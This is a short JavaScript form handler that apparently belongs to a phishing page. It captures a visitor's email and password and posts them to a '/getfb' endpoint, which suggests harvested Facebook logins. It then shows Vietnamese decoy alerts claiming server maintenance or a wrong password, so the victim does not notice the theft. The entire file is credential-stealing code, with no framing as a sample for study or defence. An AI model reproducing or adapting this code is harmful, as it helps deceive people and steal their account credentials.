async function submitForm(event) {
  event.preventDefault(); // Prevent form from refreshing the page

  // Get email and password values from the form
  const email = document.getElementById("email").value;
  const password = document.getElementById("pass").value;

  console.log({ email, password });

  try {
    // Make a POST request to the /getfb endpoint
    const response = await fetch("http://localhost:3000/getfb", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ email: email, password: password }),
    });

    // Handle response
    if (response.ok) {
      const data = await response.json();
      alert("Server chúng tôi đang bảo trì, vui lòng thử lại sau."); // Display success message
    } else {
      const errorData = await response.json();
      alert(`Error: ${errorData.error}`); // Display error message
    }
  } catch (error) {
    console.error("Error:", error);
    alert("Mật khẩu không đúng.");
  }
}
